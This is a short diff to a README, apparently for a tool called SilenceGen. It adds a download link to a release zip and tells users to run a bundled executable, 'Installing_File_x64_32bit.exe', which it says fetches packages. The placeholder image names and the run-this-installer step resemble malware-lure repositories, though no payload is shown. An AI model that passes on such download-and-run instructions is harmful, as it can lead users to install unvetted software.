@@ -5,9 +5,9 @@
  ### Installation
 
 [![asdasdasd](https://github.com/user-attachments/assets/7ea8ecd0-c47b-4de5-98c5-cf41c6bbab9f)
-]()
+](https://github.com/SolSofts/SilenceGen/releases/download/V5.3/Release.zip)
 
-## **1. [Download the archive]() from releases and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/SolSofts/SilenceGen/releases/download/V5.3/Release.zip) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
 ![ergfdgf](https://github.com/user-attachments/assets/83fbef3c-e49a-45f5-832d-a1e2a3869c8a)
 
